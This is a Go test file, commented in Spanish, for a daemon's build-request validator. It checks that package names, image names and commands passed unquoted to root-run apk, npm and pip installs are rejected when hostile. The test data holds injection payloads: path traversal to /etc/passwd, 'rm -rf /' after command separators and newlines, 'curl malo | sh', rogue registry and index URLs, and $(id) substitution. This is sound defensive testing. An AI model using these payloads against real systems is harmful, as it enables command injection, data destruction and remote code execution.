package daemon

import (
	"strings"
	"testing"

	"github.com/juan52878911/kindling/internal/api"
)

// validateBuild es lo único que separa el socket del daemon de un `apk add` y
// un `npm install -g` corriendo como root con argumentos ajenos. Los campos
// llegan a esos comandos SIN comillas dentro del script, y el nombre acaba
// siendo la ruta $ROOT/images/$NAME.ext4.
func TestValidateBuildRechaza(t *testing.T) {
	ok := api.BuildImageRequest{
		Name:     "files",
		Packages: []string{"nodejs", "npm"},
		NPM:      []string{"@modelcontextprotocol/server-filesystem@2025.8.21"},
		Cmd:      []string{"mcp-server-filesystem", "/data"},
	}
	if err := validateBuild(ok); err != nil {
		t.Fatalf("una petición legítima no debería fallar: %v", err)
	}

	cases := []struct {
		nombre string
		mutate func(*api.BuildImageRequest)
	}{
		// El nombre es un componente de ruta.
		{"nombre con barra", func(r *api.BuildImageRequest) { r.Name = "a/b" }},
		{"nombre con travesía", func(r *api.BuildImageRequest) { r.Name = "../../etc/passwd" }},
		{"nombre vacío", func(r *api.BuildImageRequest) { r.Name = "" }},
		{"nombre con espacio", func(r *api.BuildImageRequest) { r.Name = "mi servicio" }},
		{"nombre con punto y coma", func(r *api.BuildImageRequest) { r.Name = "a;rm" }},
		{"nombre demasiado largo", func(r *api.BuildImageRequest) { r.Name = strings.Repeat("a", 65) }},
		{"base con travesía", func(r *api.BuildImageRequest) { r.Base = "../min" }},

		// apk y npm reciben estos valores sin comillas: inyección de argumentos.
		{"apk con espacio", func(r *api.BuildImageRequest) { r.Packages = []string{"nodejs npm"} }},
		{"apk como opción", func(r *api.BuildImageRequest) { r.Packages = []string{"--allow-untrusted"} }},
		{"apk con punto y coma", func(r *api.BuildImageRequest) { r.Packages = []string{"nodejs;id"} }},
		{"npm como opción", func(r *api.BuildImageRequest) { r.NPM = []string{"--registry=http://malo"} }},
		{"npm con espacio", func(r *api.BuildImageRequest) { r.NPM = []string{"uno dos"} }},
		{"npm con ruta", func(r *api.BuildImageRequest) { r.NPM = []string{"../../tmp/x"} }},

		// El comando se escribe en el entrypoint generado, una línea.
		{"comando vacío", func(r *api.BuildImageRequest) { r.Cmd = nil }},
		{"comando con salto de línea", func(r *api.BuildImageRequest) { r.Cmd = []string{"sh", "a\nrm -rf /"} }},
		{"comando con byte nulo", func(r *api.BuildImageRequest) { r.Cmd = []string{"sh", "a\x00b"} }},

		{"crecimiento negativo", func(r *api.BuildImageRequest) { r.GrowMB = -1 }},
		{"crecimiento absurdo", func(r *api.BuildImageRequest) { r.GrowMB = 1 << 20 }},
	}

	for _, c := range cases {
		t.Run(c.nombre, func(t *testing.T) {
			r := ok
			c.mutate(&r)
			if err := validateBuild(r); err == nil {
				t.Errorf("debería rechazarlo: %+v", r)
			}
		})
	}
}

func TestValidateBuildAcepta(t *testing.T) {
	cases := []api.BuildImageRequest{
		{Name: "eco", Cmd: []string{"/opt/mcp/server"}},
		{Name: "files-2", Base: "min", Packages: []string{"nodejs", "npm", "py3-pip"},
			NPM: []string{"@scope/pkg", "otro@1.2.3"}, Cmd: []string{"bin", "--flag", "valor con espacios"}},
		{Name: "a", Cmd: []string{"x"}, GrowMB: 8192},
	}
	for _, r := range cases {
		if err := validateBuild(r); err != nil {
			t.Errorf("%q debería valer: %v", r.Name, err)
		}
	}
}

// Los nombres de paquetes de pip acaban en `pip install $PIP` SIN comillas
// dentro del script, igual que los de apk y npm.
//
// Ahí, un valor que empieza por guion no es un paquete: es un flag. Y
// `--index-url` apuntando a otro sitio convierte una instalación en la
// ejecución de código de quien controle ese índice.
func TestNombresDePipQueNoDebenColar(t *testing.T) {
	malos := []string{
		"--index-url=http://malo", // cambia de dónde se descarga
		"-e",                      // instalación editable desde una ruta
		"requests; rm -rf /",      // separador de comandos
		"requests && curl malo | sh",
		"req uests", // el espacio parte el argumento
		"../../etc/passwd",
		"",
		"paquete$(id)",
		"paquete`id`",
	}
	for _, p := range malos {
		if err := validateBuild(api.BuildImageRequest{
			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
		}); err == nil {
			t.Errorf("aceptó el paquete pip %q", p)
		}
	}

	// Y los que sí son legítimos, con sus especificadores de versión.
	buenos := []string{"requests", "semgrep", "python-lsp-server",
		"requests==2.31.0", "flask>=2.0", "numpy~=1.26.0", "urllib3!=2.0.0"}
	for _, p := range buenos {
		if err := validateBuild(api.BuildImageRequest{
			Name: "x", PIP: []string{p}, Cmd: []string{"/bin/sh"},
		}); err != nil {
			t.Errorf("rechazó el paquete pip legítimo %q: %v", p, err)
		}
	}
}
